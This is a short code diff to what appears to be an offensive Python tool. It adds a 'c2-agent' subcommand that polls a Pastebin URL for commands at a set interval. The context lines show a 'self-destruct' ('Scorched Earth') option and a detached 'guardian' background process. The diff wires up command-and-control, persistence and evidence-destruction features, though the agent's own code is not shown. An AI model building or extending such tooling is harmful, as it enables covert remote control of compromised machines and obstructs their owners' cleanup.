@@ -141,6 +141,11 @@ def main():
     resilience_parser.add_argument("--enable-guardian", action="store_true", help="Enable Guardian mode")
     resilience_parser.add_argument("--self-destruct", action="store_true", help="Activate Scorched Earth policy")
 
+    # C2 Agent
+    c2_parser = subparsers.add_parser("c2-agent", help="Start the C2 agent")
+    c2_parser.add_argument("--url", required=True, help="The Pastebin URL to poll for commands")
+    c2_parser.add_argument("--interval", type=int, default=60, help="Polling interval in seconds")
+
 
     args = parser.parse_args()
 
@@ -285,6 +290,9 @@ def main():
                 logging.info("Enabling Guardian mode... The guardian will run in the background.")
                 # Detach the guardian process
                 subprocess.Popen([sys.executable, "guardian.py", script_path], close_fds=True)
+
+        elif args.command == "c2-agent":
+            c2_agent(args.url, args.interval)
 
     except Exception as e:
         logging.error(f"An error occurred: {e}", exc_info=args.verbose)
